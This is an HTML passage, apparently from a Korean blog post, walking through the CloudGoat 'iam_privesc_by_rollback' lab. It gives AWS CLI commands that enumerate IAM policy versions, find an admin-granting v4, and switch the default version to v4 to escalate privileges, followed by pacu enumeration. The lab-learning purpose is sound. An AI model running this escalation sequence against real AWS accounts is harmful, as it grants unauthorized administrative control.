url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA7UlEQVQY01XKy1KCYACAUUbSmcjiqmEJaDqCGHJL8QfSvE1uWvb+j/I10srF2R1pmZRcLaICf57zHhVk9YVEnCmrE9NZytAJcLyQVyfA9UJUbYjSfab7OEDpDjBtjb7zhGoaSFV9RJQH6s8z1ZX4Iv7+Zb77IU83RHHBar2lqk+I6sBG7AnmGX6QEoQpMz9jvbcQlwdmSwtpVRxZJjVpviOKK+Jsy0e+JQxXhJFgPEmwX3xGkxh3FDF0FxjWGKs/QTM8rP4b94qLJGn/evYU3fSaZFgjzN64iXLHRG4bDaml3mjd6TfkzpWG3Nb5A65McAfOu6LUAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./2.png\"\n        title=\"./2.png\"\n        src=\"/static/10c08c750c23bc681293357cc96fcc8f/37523/2.png\"\n        srcset=\"/static/10c08c750c23bc681293357cc96fcc8f/e9ff0/2.png 180w,\n/static/10c08c750c23bc681293357cc96fcc8f/f21e7/2.png 360w,\n/static/10c08c750c23bc681293357cc96fcc8f/37523/2.png 720w,\n/static/10c08c750c23bc681293357cc96fcc8f/71c8e/2.png 875w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>해당 자격 증명 정보들을 구성하여 하나의 <code class=\"language-text\">Fake AWS Credentials</code> 를 구축하였습니다.</li>\n<li>IAM 보안 정책 그룹을 확인하기 전에 Security Credentials 을 갖고 있는 계정 정보와 IAM 사용자 액세스를 확인하였습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">aws sts get-caller-identity</code></pre></div>\n<ul>\n<li>다음 명령은 ARN을 포함하여 총 3 가지 정보를 출력합니다.</li>\n<li>AWS IAM Format를 확인한 결과 해당 Arn 정보를 통해서 Access Account ID , IAM Username 정보를 확인할 수 있었습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 28.333333333333332%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABLElEQVQY02XQ22rCUBCF4a3QGhOzkzQeUuOBGk12jppEa6EIUkqvSkvf/2H+thFE8eJjhllzMyPWmz2R2pBmW9K0Ilq/YG4/WCwzsnxHqNbESUUYFazCotmN4hMVV6gk5/hlcfyWPEV9RKhqorhmGZaU9YGiOhAUrwSrDd44pD98wrR8NH3Y6P4zRhcG9BwT6dpohoPwpwmTWcKjr1DpHpXsWAYF3jjCtCYNQ/r0pI/lzDDMMaY9QdrThuXMkXKBEA8IYSPyYsciSFFJRRQWLOIao3wnWOWouGyyOK2as1VSNrV5T1aT5c9kRcnbj8vhUzJfuQi9512doxkebd3jXuujdYfcddxz3ukOzv3JCE0fYFgWPdumozsI0ZKItnWl1b6c2Tf5DeGc/O3+AgvJnEh5Lm3fAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./3.png\"\n        title=\"./3.png\"\n        src=\"/static/e2bc2d95989beddca5255cb4048493a3/37523/3.png\"\n        srcset=\"/static/e2bc2d95989beddca5255cb4048493a3/e9ff0/3.png 180w,\n/static/e2bc2d95989beddca5255cb4048493a3/f21e7/3.png 360w,\n/static/e2bc2d95989beddca5255cb4048493a3/37523/3.png 720w,\n/static/e2bc2d95989beddca5255cb4048493a3/d9217/3.png 904w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token string\">\"Arn\"</span><span class=\"token builtin class-name\">:</span> \n\t<span class=\"token string\">\"arn:aws:iam::&lt;USERID>:user\n\traynor-iam_privesc_by_rollback_cgidesxwoc66a4\"</span></code></pre></div>\n<ul>\n<li>IAM Credentials 에 대한 보안적 요소들을 평가할 때 정책 및 권한에 대해 리스트하여 나열하는 것은 필수적인 단게입니다.</li>\n<li>username은 생각보다 긴 <code class=\"language-text\">raynor-iam_privesc_by_rollback_cgidesxwoc66a4</code> format을 이루고 있었습니다.</li>\n<li>다음 명령을 사용하여 IAM 사용자 <code class=\"language-text\">Raynor</code> 의 Inline Policy, management policy를 각각 열거해보겠습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">aws iam list-user-policies --user-name raynor-iam_privesc_by_rollback_cgidesxwoc66a4 --profi\nle bob1\n\n-<span class=\"token operator\">></span> list-user-policies 명령은 해당 유저 네임에 대한 IAM 사용자에게 연결된 정책들을 나열합니다.\n\naws iam list-attached-user-policies --user-name raynor-iam_privesc_by_rollback_cgidesxwoc66a\n<span class=\"token number\">4</span> --profile bob1\n\n-<span class=\"token operator\">></span> 관리형 정책들 을 나열합니다.</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 24.444444444444443%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAAsTAAALEwEAmpwYAAABBElEQVQY012P6U7CUBBGL4Ispbe0FOi+uhUMAqUWUSTxAUh8ABPf/ymO6TUR4o+T882XySQjnlY76t2RbXWgrA7s6wPp+4mk+qBc1zzMN6w3L2yrN9blXrmh3L5SPR+p9ztOXz6f3zHpXYyYOjlJtiTNl4wnGUPp0dc9uprDQHO47k3oazPFYOhc4Co03cWwXKTp0BtMEaI1QjcCZu4t2c0KLyiQRoA1TjDHMaZygmWnGGZ47uxz1+7Yik7XRhhmhD3LCeMFxaLGnmaKIJrj+vfKzQdR8ogfzRXNbtP7YYEXFljqeIIchYi+5qjQvNZqmwghES0DIfTfrKxfzPJfloir0R8/Gr+BUVwzdE0AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./4.png\"\n        title=\"./4.png\"\n        src=\"/static/9f3e2d5bc88f996fbcffba9b2a292381/37523/4.png\"\n        srcset=\"/static/9f3e2d5bc88f996fbcffba9b2a292381/e9ff0/4.png 180w,\n/static/9f3e2d5bc88f996fbcffba9b2a292381/f21e7/4.png 360w,\n/static/9f3e2d5bc88f996fbcffba9b2a292381/37523/4.png 720w,\n/static/9f3e2d5bc88f996fbcffba9b2a292381/636c2/4.png 911w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>Customer managed policies 에 연결되어 고객 관리형 정책은 사용자가 생성하고 AWS 계정의 여러 사용자, 그룹 또는 역활에 연결할 수 있는 독립형 자격 증명 기반 정책으로 이루워집니다.</li>\n<li><code class=\"language-text\">cg-raynor-policy</code> 는 IAM 사용자 “cg-raynor-policy-iam_privesc_by_rollback_cgidesxwoc66a4” 에 직접 연결됩니다.</li>\n</ul>\n<h3 id=\"raynor-이전-버전의-iam-policies\" style=\"position:relative;\"><a href=\"#raynor-%EC%9D%B4%EC%A0%84-%EB%B2%84%EC%A0%84%EC%9D%98-iam-policies\" aria-label=\"raynor 이전 버전의 iam policies permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Raynor 이전 버전의 IAM policies</h3>\n<ul>\n<li>Customer managed policies에서 IAM을 <code class=\"language-text\">list-policies</code>를 통해 관리형 정책들을 나열하고 <code class=\"language-text\">--only attachged</code> 옵션을 통해 연결된 정책만 추출하고 <code class=\"language-text\">--scope</code> 범위를 Local로 지정하여 해당 범위 내에서만 검색하여 고객 관리형 정책만 추출하고 <code class=\"language-text\">--query</code> 옵션을 통해 관련된 정보를 추출하는데 사용하여 좀더 세부적으로 정책들을 나열하겠습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">aws iam list-policies <span class=\"token punctuation\">\\</span> \n--only-attached <span class=\"token punctuation\">\\</span> \n--scope Local <span class=\"token punctuation\">\\</span>\n--query <span class=\"token string\">\"Policies[?starts_with(PolicyName, 'cg')]\"</span> <span class=\"token punctuation\">\\</span>\n--profile bob1</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 36.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAABUUlEQVQoz42RyVLCQBCGhwgihGyEJSSEnZiQBYPgvpblQTn5CD6C73/4rBlLL1ZZHr7p6Z5/uubvEe/Fno/ijVW6pTy94Wx3S3a3JyhuiJYFx0lJFJfEyYYk3bKM1sSrjSIrLliXW25fQ55eZmT+HOFYIbYxxLBDLGeEbga47RFGa4BWc6nVO9SOumi1tooqr3epN3oqCmEghP1FxUKIiqmEi2jDbHHCeJqTFlfk62u2Z48k6TmeHykGwfEPQZiommEFmM4XjWYfYbtjdTCa5vS8JT1vgWmHmPaQlukrdGOAbvg0WwOaLY+G7v3sZV1qJQ29jxCazeFRlzS/JCsuSfML/GGM05koW5UDaUdHOhGa9RtZ/0bmcpEXT3cPnF89EyXyc+6JVzsms4L5smQ0yageuqq5VnX+RMghyxd2ejOFtON2p7Q7E2VdjkAixf9p+Ak7/bJOsC7olgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./5.png\"\n        title=\"./5.png\"\n        src=\"/static/0c7e2fe9b8e074143c47f00bdac78f03/37523/5.png\"\n        srcset=\"/static/0c7e2fe9b8e074143c47f00bdac78f03/e9ff0/5.png 180w,\n/static/0c7e2fe9b8e074143c47f00bdac78f03/f21e7/5.png 360w,\n/static/0c7e2fe9b8e074143c47f00bdac78f03/37523/5.png 720w,\n/static/0c7e2fe9b8e074143c47f00bdac78f03/6029f/5.png 906w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>Customer managed policies에 대한 <code class=\"language-text\">cg-raynor-policy-iam_privesc_by_rollback_cgidesxwoc66a4</code> 추가 정보를 확인할 수가 있으며 기본 버전 값은 <code class=\"language-text\">v1</code> 임을 인지할 수 있었습니다.</li>\n<li>aws 정책에 따라 IAM Customer managed policies을 변경하고 AWS가 정책을 변경할 때 젼경된 정책은 기존 정책을 덮어쓰지 않씁니다.</li>\n<li>대신 IAM은 관리형 정책의 새로운 버전을 생성합니다. 총 IAM은 Customer Managed Policies를 최대 5개 버전을 저장합니다.</li>\n<li>정책에 대한 권한에 대한 충분한 정책 세부 정보들을 해당 <code class=\"language-text\">v1</code> 버전에 맞게 정책 권한들을 나열하였습니다. 해당 형태의 format은 <code class=\"language-text\">json</code> 에 따릅니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">aws iam get-policy-version <span class=\"token punctuation\">\\</span>\n--policy-arn arn:aws:iam::<span class=\"token operator\">&lt;</span>USERID<span class=\"token operator\">></span>:policy/cg-raynor-policy-iam_privesc_by_rollback_cgidesxwoc66a4 <span class=\"token punctuation\">\\</span> \n--version-id <span class=\"token string\">\"v1\"</span> <span class=\"token punctuation\">\\</span> \n--profile bob1 <span class=\"token punctuation\">\\</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 51.66666666666666%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAAAsTAAALEwEAmpwYAAABeklEQVQoz41SyVLCQBCdsAcC2QlJCDuJgBQGEmRVD0qVB0/6/7/yrG7A4oAUh1c9Mz39+vUiJtMUy9UrZk8rbHbvWD3vMX37QnvziWWyxSxeI15skC5fME+22O0/sH89IEn3iOdbxIs1Dj8eDt8+OqEPYdpdNFtjBJ1HBO0JGl6IemMIy+mDfFa9z6CzYXXguENGVW2irLioVF3IigO50kChZEEISUWp7GAYLTCLd7DqPVSqHr8JqQYhZAhRgRDlkyUoR19GBcWzzaiQMhpEJqezM1cwWWnDj6CbHUZNC1DTAyg1H6oe8L0o10Ex/0FIWY0PZCmzYXURjhIMwhi62WaiqupDM+jcYsJzzE3CM+je7k4xnq7geCE0o8X9I5VCHMs8/7tKeOkk6wcjeMEIpt3jsq8F3qUwX7T+LE2MenrMeGr4RdKbPaTPNO5olGIQzlkhlUgDKJRs7llRtu8iY0JSQqq85gNPmdbG9SPeR9o12xnwWzZv3EX4C9Iu8mGzsK70AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./6.png\"\n        title=\"./6.png\"\n        src=\"/static/7c5d6204f9ea499ca8b0a14a8312e28e/37523/6.png\"\n        srcset=\"/static/7c5d6204f9ea499ca8b0a14a8312e28e/e9ff0/6.png 180w,\n/static/7c5d6204f9ea499ca8b0a14a8312e28e/f21e7/6.png 360w,\n/static/7c5d6204f9ea499ca8b0a14a8312e28e/37523/6.png 720w,\n/static/7c5d6204f9ea499ca8b0a14a8312e28e/58213/6.png 902w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>Policies Document에 따르면 정책이 있는 IAM credential이 모든 리소스에 대해 IAM 에 대한 import, list 작업을 수행할 수 있었음을 보여드렸습니다.</li>\n<li>해당 정책은 또한 <code class=\"language-text\">\"iam:SetDefaultPolicyVersion</code> 모든 리소스에 대해 하나의 “Setting” 작업이 허용되었다는 것을 보여주고 있습니다.</li>\n<li>해당 권한들의 리스트들은 정상적으로 보이고 많은 보안 스캐너에 의해 플래그가 지정되지 않을 수도 있지만 “iam:SetDefaultPolicyVersion” 허용된다는 점이 심각한 보안 문제를 야기할 수 있습니다.</li>\n</ul>\n<h3 id=\"iamsetdefaultpolicyversion-권한이-왜-보안-문제일까\" style=\"position:relative;\"><a href=\"#iamsetdefaultpolicyversion-%EA%B6%8C%ED%95%9C%EC%9D%B4-%EC%99%9C-%EB%B3%B4%EC%95%88-%EB%AC%B8%EC%A0%9C%EC%9D%BC%EA%B9%8C\" aria-label=\"iamsetdefaultpolicyversion 권한이 왜 보안 문제일까 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>iam:SetDefaultPolicyVersion 권한이 왜 보안 문제일까?</h3>\n<ul>\n<li>\n<p><code class=\"language-text\">SetDefualtPolicyVersion</code> 은 지정된 정책의 지정된 버전을 정책의 default 버전으로 설정합니다. 해당 작업은 정책이 연결된 모든 사용자 구룹, 역활에 영향을 줍니다.</p>\n</li>\n<li>\n<p>해당 권한이 있는 IAM Access Credential은 현재 사용하지 않는 기존 정책 버전을 통해 권한을 승격할 수 있습니다.</p>\n</li>\n<li>\n<p>액세스 권한이 있는 정책에 기본값이 아닌 버전이 있는 경우 기본 버전을 다른 기존 버전으로 변경할 수가 있습니다.</p>\n</li>\n<li>\n<p><code class=\"language-text\">iam:SetDefaultPolicyVersion</code> 설정이 어떻게 보안 문제로 이어져있는지 확인하기 위해 다른 버전의 고객 관리 정책이 있는지 확인을 해야 합니다.</p>\n</li>\n<li>\n<p><code class=\"language-text\">cg-raynor-policy-iam_privesc_by_rollback_cgidesxwoc66a4</code>  최대 5가지 버전이 존재합니다.</p>\n</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 19.444444444444443%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA/UlEQVQY0z3Fy1KCUACA4SOZVlN5ZUJBEU0QBEKUywEkxhldtmvRvk3v/wB/M9W0+OYTSVqRy4Y0KymKI5UsCOoLk+aNdJ+QpDm73QEpS/K8QBYV1fGVsqyp64aqPHG6JHx8qbx/ThDL5wh95jEYmZiWj6bb6LqNqa8xTI+J7rBYhjwZHuPpBqU9QIgHhPKIUHq/t/oIoSLEGOG4CaYVMF/45MWZbSgJo4oorokPDe424yWuseMzxmrPdVelc6PS7oxoXfX/CeXPah2xsHyMuUt8qHG9hE0gmTkJfpBhu3v8UOJ4CZ6fYa1CtOma/nBG91b9cXc/Zqj1GGk9vgHvh3I7RtlAfAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./7.png\"\n        title=\"./7.png\"\n        src=\"/static/456359012ed7b3ac5c682cb55fc169fe/37523/7.png\"\n        srcset=\"/static/456359012ed7b3ac5c682cb55fc169fe/e9ff0/7.png 180w,\n/static/456359012ed7b3ac5c682cb55fc169fe/f21e7/7.png 360w,\n/static/456359012ed7b3ac5c682cb55fc169fe/37523/7.png 720w,\n/static/456359012ed7b3ac5c682cb55fc169fe/79e48/7.png 865w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>assets 폴더안에는 각 버전별로 존재하고 있는 것을 확인할 수 있습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 63.888888888888886%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAAsTAAALEwEAmpwYAAABk0lEQVQ4y52SSU/CUBSFy1AoMnRuKXSmIFIG3TBLwKjRDUu3mhA3rtz5H/zTx9yHTcDEpLA4OX29571+vfdx2+0Ldh9rvH+N8Pn2gO/FK543O0S3T1gvNxhPVpgvNlje3jMnLZZ3mM3XWK0fMZ6ucH0zZe+jzhCcUW+jN+yjPQhhWza8cghLsCDJDkTFg6R4kFUfihZA1UPm5WoTNclhtVLZQiYngy/qyPEqOC4rgi8YEKUQZqOLiuairLgoCBRQQPVMTmTOZWp7ZQ/WrC6xDDmXzcsgaUaAeDBF2BrBCwbwwyEsuwtF82FabUiKyzYk+f/EUYgvaqjUmr8bPVRFmxHyRZVRkiic6sDkQTdb6A2mCFojuH5/T9i8hKx6MOoRRNllv5easCo2UW902AHU8GLJQL6wJ0z8JELNaOEqnjCyY0L/XEIbDTaE4IiQQkkfTyQM0Y3HbMKOF/8hbJ9GSBMlKiJU9QCi7EC4MM/vIQVpyvFwhiDa30Oatm5GBz100hEWBI0RJl9PnKhI1N/kTqYh/AHimDxglXPKeQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./8.png\"\n        title=\"./8.png\"\n        src=\"/static/eb2917ca2595825d68aa5aa706911599/37523/8.png\"\n        srcset=\"/static/eb2917ca2595825d68aa5aa706911599/e9ff0/8.png 180w,\n/static/eb2917ca2595825d68aa5aa706911599/f21e7/8.png 360w,\n/static/eb2917ca2595825d68aa5aa706911599/37523/8.png 720w,\n/static/eb2917ca2595825d68aa5aa706911599/65d79/8.png 905w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>5가지 정책 버전이 <code class=\"language-text\">cg-raynor-policy-iam_privesc_by_rollback_cgidesxwoc66a4</code> 에 있습니다.</li>\n<li>자 그러면<code class=\"language-text\">raynor-policy-iam_privesc_by_rollback_cgidesxwoc66a4</code>  사용자 <code class=\"language-text\">iam:SetDefaultPolicyVersion</code> 에게 기본 버전 v1에 대한 권한이 있으므로 사용자는 모든 버전으로 롤백이 가능합니다.</li>\n<li>이러한 버전에 추가 권한이 있는 경우 권한 상승이 가능하고 추가 권한에 따라 각각 다르게 나타납니다.</li>\n<li>각 정책 버전을 나열하고 추가 권한에 대한 액세스 권한을 얻을 수 있는지 확인해보겠습니다.</li>\n</ul>\n<h3 id=\"취약한-정책-버전\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%ED%95%9C-%EC%A0%95%EC%B1%85-%EB%B2%84%EC%A0%84\" aria-label=\"취약한 정책 버전 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>취약한 정책 버전</h3>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">aws iam get-policy-version --policy-arn arn:aws:iam::<span class=\"token operator\">&lt;</span>USERID<span class=\"token operator\">></span>:policy\n/cg-raynor-policy-iam_privesc_by_rollback_cgidesxwoc66a4 --version-id <span class=\"token string\">\"v4\"</span> --profile bob1</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 40.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAABLUlEQVQoz42R3U7CQBCFFxD56bbdUpGfllJSGpGo0FYKtEF6Y/QN9I7EB/D9746ZKYp3cPHtbHbOnN3ZEbvdOz4Pexy+p/j4irFe5Qi2bwjXr8i2BaIkx3P6gmWc8T6K8zIeSdd7pJsCT8sNBk4IYagRRv4M09kcrh/CtDxI2YfUB6Ccbrp8RvuW1odmOGjLAZrtHkN5onJlQdQUhKiaaLRuEUxjREmBbi+AZfssqpKoYpyomqf4yzFXqalSXy4mavUOVMfD0L2H3Z1AGkNcN7ssuhxVGpI7QTdNggXCu4SNqVW67L/mnKkgUb1xw21TZGOhQwhZRmpJGH8F50wFFWj6EMmqwMMiQxBG8CaPcLw5/6Nlj6E648tfSK8idNNhA5okT065PE1pOMylhj/mTsKpNHHf5gAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./9.png\"\n        title=\"./9.png\"\n        src=\"/static/cfb0bf407cddc42a96a750caa66dd198/37523/9.png\"\n        srcset=\"/static/cfb0bf407cddc42a96a750caa66dd198/e9ff0/9.png 180w,\n/static/cfb0bf407cddc42a96a750caa66dd198/f21e7/9.png 360w,\n/static/cfb0bf407cddc42a96a750caa66dd198/37523/9.png 720w,\n/static/cfb0bf407cddc42a96a750caa66dd198/0955e/9.png 901w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>정책 버전 4에는 심각한 취약점이 존재합니다.</li>\n<li>v4의 권한은 사용자에게 AWS 계정에 대한 관리 액세스 권한에대해 <code class=\"language-text\">Effect: Allow</code> 를 부여하고 있습니다.</li>\n<li>Highly-level iam 사용자로부터 v4 를 기본 버전으로 만들어보겠습니다. v4를 기본버전으로 만들어서 관리자 액세스 권한이 있는 사용자가 되도록 Escalation을 진행하는 것 입니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">aws iam <span class=\"token punctuation\">\\</span>\n set-default-policy-version <span class=\"token punctuation\">\\</span> \n--policy-arn arn:aws:iam::<span class=\"token operator\">&lt;</span>USERID<span class=\"token operator\">></span>:policy/cg-raynor-policy-iam_privesc_by_rollback_cgidesxwoc66a4 <span class=\"token punctuation\">\\</span> \n--version-id v4 --profile bob1</code></pre></div>\n<ul>\n<li><code class=\"language-text\">pacu</code> open source tools 를 이용하여 IAM enumerating을 하여 추가 사용 권한을 획득하겠습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">run iam__enum_permissions</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 37.222222222222214%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAABNUlEQVQoz2VRaW+CQBBdj9pYRWBB5D7kFKUtFXokTez//1OvmRG0ST+87OzAO3ZG2F6JoupQHnpGlDTYZ68oDx3y8owgOsJycjytHcwXEkIoEJPNFVP1Xo/3JH3BsfnCuf9B211Q1e+I9g3a8wXP7TeOzSey4o3Fs6JlA+Ls2MSGovpYb1xsNB/LlQ3h+BVMK4XjlQzT2nMa2y2YRD3LzuB4FTQZDuTgJqTq15q+EU9IM8Z2l4KERxE/rOGFNZ+PS4tB7tO5/v+JYy2GO6nTE4gcxCd4wQFym3AyMtBkBGObQDcikLm5SzkApSbMFwYmM43N2NCyc9SnD55dVfcsTosZFyLNhBMSafYgb8S/GPv0j3D9irdMSIsW4ZCS+iRGoES6GXNNs1opLqejWlE9fgHNjwR/ASBjs6IbPz8qAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./10.png\"\n        title=\"./10.png\"\n        src=\"/static/7058281f09060b29aab79cbe993142e2/37523/10.png\"\n        